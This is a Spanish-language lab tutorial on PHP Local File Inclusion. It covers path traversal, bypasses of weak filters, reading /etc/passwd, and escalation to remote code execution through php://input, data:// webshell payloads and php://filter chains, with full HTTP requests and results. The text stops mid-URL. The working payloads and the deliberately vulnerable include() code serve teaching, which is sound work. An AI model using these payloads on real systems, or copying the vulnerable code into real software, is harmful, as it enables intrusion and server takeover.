# Resumen de Local File Inclusion (LFI)

## ¿Qué es LFI?

> Una vulnerabilidad que ocurre cuando una aplicación web permite al usuario incluir archivos locales del servidor sin validar adecuadamente los parámetros de entrada. Esto puede dar acceso a información sensible del sistema.

## Conceptos clave explicados:

**LFI (Local File Inclusion):** Técnica que permite a un atacante leer archivos del sistema a través de una aplicación vulnerable.

**Parámetro vulnerable:** Campo en la URL o formulario donde el usuario especifica un archivo que será cargado o procesado por el servidor. Ejemplo:  
`http://example.com/index.php?page=home`  
Un atacante podría manipularlo así:  
`http://example.com/index.php?page=../../../../etc/passwd`

**Path Traversal:** Técnica usada para moverse entre directorios mediante secuencias como `../`  . Permite alcanzar archivos fuera del directorio previsto.

## Cómo se explota LFI

El atacante manipula el parámetro que carga archivos, inyectando rutas relativas para acceder a ficheros del sistema, como:

```
?page=../../../../etc/passwd
```

Esto puede revelar información sensible como usuarios del sistema, contraseñas, claves SSH, logs, etc.

### LFI + ejecución de código

En algunos casos, si el servidor permite subir archivos (por ejemplo, imágenes) y luego cargarlos, un atacante puede subir un archivo PHP malicioso y luego incluirlo usando LFI para ejecutar comandos.

## Prevención

- Validar y sanear las entradas del usuario.
- No permitir incluir archivos basados directamente en entradas de usuarios.
- Usar listas blancas (whitelisting) de archivos permitidos.
- Configurar adecuadamente permisos del servidor para limitar el acceso a archivos sensibles.

---
# Glosario

| **Término**         | **Explicación**                                                                 |
|---------------------|----------------------------------------------------------------------------------|
| **LFI**             | *Local File Inclusion*. Inclusión de archivos locales desde el servidor.        |
| **Path Traversal**  | Técnica que usa `../` para moverse entre carpetas y acceder a archivos sensibles.|
| **Archivo sensible**| Archivos como `/etc/passwd`, `.bash_history`, logs, claves privadas, etc.       |
| **Vector de ataque**| Forma en que se manipula una entrada para aprovechar la vulnerabilidad.         |
| **Subida de archivos** | Funcionalidad peligrosa si no se validan extensiones ni se protege la ubicación.|

---
# Guía de ejecución

## Puerba de concepto

Acción 1: vamos al directorio `/var/www/html` con **pushd - popd** 

```bash
pushd /var/www/html
```
Acción 2: creamos archivo para prueba de concepto 

```bash
nvim index.php
```
**Index.php:**

```php
<?php
  $filename = $_GET['filename'];
  include($filename);
?>
```

Acción 3: creamos archivo de prueba para listar por el navegador

```bash
nvim test
```

**test:**

```bash
Hola mundo
```

Acción 4: Arrancamos servidor apache

```bash
service apache2 start
```

Acción 5: Accedemos vía navegador

```URL
http://localhost/index.php?filename=test
```

Acción 6: Probamos listar archivos del servidor

```URL
http://localhost/index.php?filename=/etc/passwd
```

Explicación: Comprobamos el funcionamiento de *Local File Inclusion*. Ahora procederemos a sanitizar levemente el archivo index.php y a prácticar *Path Traversal**


## Path Traversal

Acción 1: sanitizamos index.php

```php
<?php
  $filename = $_GET['filename'];
  include("/var/www/html/" . $filename);
?>
```

Acción 2: en la URL no podemos ahora acceder por la vía de antes tenemos que hacer *Path Traversal**

```URL
http://localhost/index.php?filename=../../../../etc/passwd
``` 

Explicación: Con `../../../../` retrocedemos varios directorios para tratar de llegar a la raíz del sistema

Acción 3: sanitización mejor (sigue siendo una chapuza ambas sanitizaciones pero para ejemplificar)

```php
<?php
  $filename = $_GET['filename'];
  $filename = str_replace("../", "", $filename);
  include("/var/www/html/" . $filename);
?>
```

Explicación: con `str_replace` sustituimos `../` por nada `""` por lo que ahora no se podría usar la técnica anterior

Acción 4: hacemos *Path Traversal* más sofisticado

```URL
http://localhost/index.php?filename=....//....//....//....//etc/passwd
```

Explicación: como la sanitización lo que hace es quitar `../` podemos añadir otra tanda más para así volver a llegar al punto anterior y listar la información

Acción 5: nueva sanitización en indext.php - Inclusión de solo archivos .php

```php
<?php
  $filename = $_GET['filename'];
  $filename = str_replace("../", "", $filename);
  include("/var/www/html" . $filename . ".php");
?>
```

Explicación: esta sanitización limita al atacante a incluir solo archivos `.php`. Pero no impide que se abuse del sistema si hay archivos PHP maliciosos subidos por el atacante.

**Nota:** Estas sanitizaciones son inseguras y fáciles de evadir. En un entorno real, siempre debemos validar con listas blancas, evitar include() directo, y desactivar funciones peligrosas si no se usan (allow_url_include, allow_url_fopen...).

Ejemplo de sanitizción más segura:

```php
if (preg_match('/^[a-zA-Z0-9_-]+$/', $filename)) {
  include("/var/www/html/pages/" . $filename . ".php");
}
```
Evitar el uso directo de include() con datos del usuario.

Usar una lista blanca de archivos permitidos.

Validar con expresiones regulares estrictas

No concatenar extensiones o rutas directamente sin control


**Nota**: para versiones *desactualizadas* de PHP (anteriores a la *versión 5.3*) podemos contemplar un 'Null Byte': %00

```URL
http://localhost/index.php?filename=....//....//....//....//etc/passwd%00
```

### ¿Qué es un Null Byte?

> Un Null Byte (\0 en programación, o %00 en codificación URL) es un carácter nulo que indica el final de una cadena en lenguajes como C o C++. En el pasado, se usaba en ataques para truncar rutas de archivos o engañar a funciones que tratan cadenas de texto.

### ¿Cómo se usaba en LFI?

Antiguamente, cuando un servidor añadía automáticamente una extensión .php a lo que el usuario enviaba, podías usar %00 para truncar esa parte y conseguir cargar otro archivo:

**Ejemplo clásico:**

Supongamos que el código hace esto:

```php
include($_GET['file'] . ".php");
```

Si enviamos:

```bash
http://example.com/index.php?file=../../../../etc/passwd%00
```

Entonces:

El servidor interpreta hasta el %00 como final de cadena.

Y carga `/etc/passwd` en vez de `/etc/passwd.php`

- Esto ya no suele funcionar en versiones modernas de PHP, porque desde PHP 5.3.4 y otros lenguajes se ha corregido esta vulnerabilidad (ya no se interpreta %00 como \0).


## Iniciar laboratorio

Acción 1: Descargar imagen docker de ubuntu para montarnos un servidor web vulnerable a LFI y probar wrappers

```bash
docker pull ubuntu:latest
```

Acción 2: montamos la imagen descargada

```bash 
docker run -dit -p 80:80 --name testing_LFI 602eb6fb314b
```

Acción 3: entramos con una bash al docker creado

```bash
docker exec -it testing_LFI bash
```

Acción 4: Instalar dependencias necesarias en el docker

```bash
apt update
apy install nano apache2 php -ya
```

Acción 5: Arrancamos servicio de apache dentor del docker, vamos a la ruta `/var/www/html/` borramos su actual index.html y editamos con nano un archivo index.php

```nano
<?php
	echo "Hola mundo";
?>
```

Explicación: si en nuestro navegador accedemos a localhost y nos muestra "Hola mundo" estamos interpretando código php y podemos comenzar a crear configuraciones de cara a practicar LFI


## Paso 4 - Uso de wrappers

Acción 1: modificamos index.php y creamos un secret.php para tratar de visualizarlo

```nano
<?php
	$filename = $_GET['filename'];
	include($filename);
?>
```

```nano
<?php
	// No deberíamos de ver este mensaje, ya que el código debería de ser interpretado
?>
```

Explicación: en el navegador al acceder a localhost no deberíamos de poder ver este mensaje

Acción 2: podemos ver `/etc/passwd` pero no `secret.php` (porque interpreta el código php)

```URL
http://localhost/?filename=/etc/passwd
```

```URL
http://localhost/?filename=secret.php
```
**Nota:** aquí entran en juego los *wrappers*

Acción 3: wrapper para mostrar el contenido del archivo en base64

**Wrapper:** php://filter/convert.base64-encode/resource=

```URL
http://localhost/?filename=php://filter/convert.base64-encode/resource=secret.php
```

```bash
echo "PD9waHAKCS8vIE5vIGRlYmVyaWFtb3MgcG9kZXIgdmVyIGVzdG8sIHlhIHF1ZSBlc3RlIGNvZGlnbyBkZWJlcmlhIHNlciBpbnRlcnByZXRhZG8KPz4K" | base64 -d
```

Resultado:

```php
<?php
	// No deberiamos poder ver esto, ya que este codigo deberia ser interpretado
?>
```

Explicación: Se utiliza el wrapper php://filter para aplicar un filtro que convierte el contenido del archivo secret.php a base64 antes de procesarlo. Esto permite visualizar el contenido del archivo original aunque normalmente esté protegido contra lectura directa, ya que el filtro lo trata como si fuera texto plano en lugar de ejecutarlo como PHP. Es una técnica útil cuando el servidor no valida correctamente las entradas y permite usar wrappers especiales como parte del nombre del archivo.

Acción 4:  wrapper para mostrar el contenido en utf-16

```URL
view-source:http://localhost/?filename=php://filter/convert.iconv.utf-8.utf-16/resource=secret.php
```

**Nota:** ctrl+U para ver código fuente (view-source:)

Ecplicación: En este caso, se utiliza el wrapper php://filter con el filtro convert.iconv.utf-8.utf-16, que convierte el flujo de datos del archivo desde UTF-8 a UTF-16. Aunque el wrapper es válido y realiza la conversión correctamente, no resulta útil en la mayoría de contextos de pentesting

### Wrapper para RCE

Acción 1: abrimos BurpSuite

```bash
burpsuite &>/dev/null & disown
```

Acción 2: capturamos petición con BurpSuite

```URL
view-source:http://localhost/?filename=prueba
```

Acción 3: enviamos al repeat la petición interceptada

```xml
GET /?filename=prueba HTTP/1.1

Host: localhost

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

DNT: 1

Sec-GPC: 1

Connection: keep-alive

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: none

Sec-Fetch-User: ?1

Priority: u=4
```

Acción 4: modificamos parámetro GET para usar wrapper que nos permita ejecutar comandos en el sistema (RCE)

```xml
POST /?filename=php://input HTTP/1.1

Host: localhost

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

DNT: 1

Sec-GPC: 1

Connection: keep-alive

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: none

Sec-Fetch-User: ?1

Priority: u=4

Content-Type: application/x-www-form-urlencoded

Content-Length: 26



<?php system("whoami"); ?>
```

Resultado: obtenemos el comando `whoami` (www-data)

```xml
HTTP/1.1 200 OK

Date: Tue, 15 Apr 2025 20:49:16 GMT

Server: Apache/2.4.58 (Ubuntu)

Content-Length: 9

Keep-Alive: timeout=5, max=100

Connection: Keep-Alive

Content-Type: text/html; charset=UTF-8



www-data
```

Explicación: cambios el método GET por **POST**, introducimos el **wrapper php://input** y probamos ejecución de comandos con `<?php system("whoami"); >`

Problema: al enviar la petición en el repeat de BurpSuite no obteniamos la data ejecutada con `whoami`

Solución: `nano /etc/php/8.3/apache2/php.ini` --> ctrl+w (allow_url_include) el que aparece en Off lo ponemos en On --> `service apache2 restart` --> en BurpSuite con click derecho selenccionamos cambiar el método para pasar de POST a GET (para evitar errores de sistaxis al cambiarlo manualmente)

Acción 5: **wrapper data://text/plain;base64,** para RCE

```xml
GET /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ3aG9taSIpOyA/Pg== HTTP/1.1

Host: localhost

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

DNT: 1

Sec-GPC: 1

Connection: keep-alive

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: none

Sec-Fetch-User: ?1

Priority: u=4

```

**Nota:** en BurpSuite en la pestaña 'Decode' podemos obtener diferentes codificaciones de forma rápida y sencilla ( `PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTsgPz4= --> <?php system("whoami"); ?>` )

Problema: Problema con la inyección de comandos, probamos a cambiar el código con etiquetas.

Solución `echo '<?php echo "<pre>"; system("whoami"); echo "</pre>"; ?>' | base64`

```xml
GET /?filename=data://text/plain;base64,PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oIndob2FtaSIpOyBlY2hvICI8L3ByZT4iOyA/Pgo= HTTP/1.1

Host: localhost

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

DNT: 1

Sec-GPC: 1

Connection: keep-alive

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: none

Sec-Fetch-User: ?1

Priority: u=4


```

Problema: no nos interpreta ciertos códigos

Solución: URLenodear con ctrl+u en repeat de BurpSuite y ya nos vale, además añadir etiquetas preformateadas `<pre>`

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>  --> PD9waHAgZWNobyAiPHByZT4iIC4gc2hlbGxfZXhlYygkX0dFVFsiY21kIl0pIC4gIjwvcHJlPiI7ID8+  --> al tener valores especiales como el más (+) no nos lo reocnocía bien por eso lo de URLencodear --> a esto aplicamos: PD9waHAgZWNobyAiPHByZT4iIC4gc2hlbGxfZXhlYygkX0dFVFsiY21kIl0pIC4gIjwvcHJlPiI7ID8%2b*&cmd=whoami*
```
## Prueba de concepto LFI > RCE 

Acción 1: 

```bash
php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.CSISO2022KR/resource=/tmp/test');"; echo
```

Resultado: 

```bash
)CYmFzZTY0==
```

Explicación: teniamos codificado en base64 en un archivo test lo siguiente: `YmFzZTY0==` al aplicar el wrapper `php://filter/convert.iconv.UTF8.CSISO2022KR` vemos que se añaden dos caracteres al inicio `)C` . Esto nos permite encadenar wrappers para arbitrariamente incluir caracteres y conseguir ejecutar un *RCE*

Extra: vemos en hexadecimal los caracteres añadidos

```bash
php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.CSISO2022KR/resource=/tmp/test');" | xxd

00000000: 1b24 2943 596d 467a 5a54 5930 3d3d 0a    .$)CYmFzZTY0==.
```

Acción 2: 

```bash 
php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=/tmp/test');"; echo
```

Resultado: 

```bash 
CYmFzZTY
```

Explicación: encadenando el siguiente *wrapper* `php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode` , al archivo test le quitamos los iguales dejando la codificación de 'base64' por defecto 'YmFzZTY' y como vemos le añade un caracter (C) al principio confirmando una forma limpia de poder hacer RCE

Acción 3: ejemplo de **Filter Chains**

```bash 
php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp');"; echo
```

Reultado: 

```bash 
a+-ABsAJA
```

Explicación: para introducir el comando deseado se tiene que introducir caracter a caracter pero al revés, para este ejemplo introducimos 'Hola', por ello tenemos que ingresar 'aloH'. Podemos ver que tenemos una 'a' incorporada al inicio del código

**Nota:** para este ejemplo apuntamos hacia la ruta `php://temp`, recurso al que podemos apuntar en caso de no conocer o saber a cual dirigirnos en este contexto

Acción 4: 

```bash 
php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp');"; echo
```

Resultado:

```bash 
la+-ABsAJ
```

Explicación: concatenamos el conjunto de comandos de la lista de [Filter Chains](#Filter%20Chains) correspondiente (l) con el anterior, teniendo en cuenta de añadir la regla de UTF8.UTF7 para esquivar posible `=`

Acción 5: pasamos a ver el final

```bash
php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp');"; echo
```

Resultado:

```bash 
Hola+-ABs
```

Explicación: conseguimos inyectar la cadena 'Hola' Ahora podemos automatizar esto con el recurso *Filter Chains* [^1] e inyectar una reverse shell **RCE**

**Nota:** para saber más de `php://temp` ver explicación en [Para saber más](#Para%20saber%20más)

Acción 6: URL 

```URL
http://localhost/?filename=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp
```

Resultado:

```xml
Hola+-ABs
```

Explicación: si en el navegador podemos interpretar esta cadena, podemos probar a derivar este LFI a un RCE

## Automatización del proceso 

Acción 1:

```bash
echo -n '<?php system("whoami"): ?>' | base64

PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTogPz4=

--------------------------------------------------

echo "PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTogPz4=" | rev

=4zPgoTKikWbh9Ga3JCKtVGdzl3cgAHaw9DP
```

Explicación: Primero explicamos una inyección de comando a través de un LFI con el recurso *Filter Chains*. Para ello necesitamos tener en base64 el comando a ejecutar (al revés) para saber la combinación de Filter Chains


Acción 2: 

```URL  
http://localhost/?filename=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode... lo correspondiente ...|convert.base64-decode|convert.iconv.UTF8.UTF7/resource=php://temp
```

Explicación: con su concatenación de combinaciones resultante, al principio añadimos un encode y al final un decode, como se puede ver en la acción

Acción 3: 

```bash 
git clone https://github.com/synacktiv/php_filter_chain_generator
cd php_filter_chain_generator
python3 php_filter_chain_generator.py -h
```

Acción 4: 

```bash 
python3 php_filter_chain_generator.py --chain '<?php system("whoami"); ?>'
```

Resultado:

```bash
[+] The following gadget chain will generate the following code : <?php system("whoami"); ?> (base64 value: PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTsgPz4)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

Explicación: con esta herramienta automatizamos muy rápido el proceso de crear el wrapper necesario para ejecutar comando a través de un LFI. Del mismo modo podríamos enviarnos una reverse shell mientras estamos en escucha con netcat por ejemplo y ganar acceso al servidor.

Acción 5:

```URL 
http://localhost/?filename=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.